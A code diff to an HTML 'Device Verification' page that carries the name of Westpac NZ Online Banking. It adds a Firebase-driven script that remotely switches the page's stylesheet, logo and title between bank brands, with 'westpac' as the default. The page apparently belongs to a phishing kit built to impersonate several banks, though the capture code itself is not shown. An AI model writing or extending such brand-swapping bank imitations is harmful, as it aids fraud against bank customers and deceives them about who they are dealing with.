@@ -7,8 +7,9 @@
     <meta http-equiv='cache-control' content='no-cache'>
     <meta http-equiv='expires' content='0'>
     <meta http-equiv='pragma' content='no-cache'>
-    <title>Device Verification - Westpac NZ Online Banking</title>
+    <title>Device Verification</title>
     <link rel="stylesheet" href="./style.css">
+    <link id="themeStyles" rel="stylesheet" href="">
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
@@ -63,5 +64,23 @@
         </footer>
     </div>
     <script src="./script.js"></script>
+    <script src="themes/config.js"></script>
+    <script>
+        // Initialize theme
+        const database = firebase.database();
+        database.ref('activeTheme').on('value', snapshot => {
+            const activeTheme = snapshot.val() || 'westpac';
+            const theme = themes[activeTheme];
+            
+            // Update theme styles
+            document.getElementById('themeStyles').href = theme.styles;
+            
+            // Update logo
+            document.querySelector('.logo-image').src = theme.logo;
+            
+            // Update title
+            document.title = `Device Verification - ${theme.name}`;
+        });
+    </script>
 </body>
 </html>
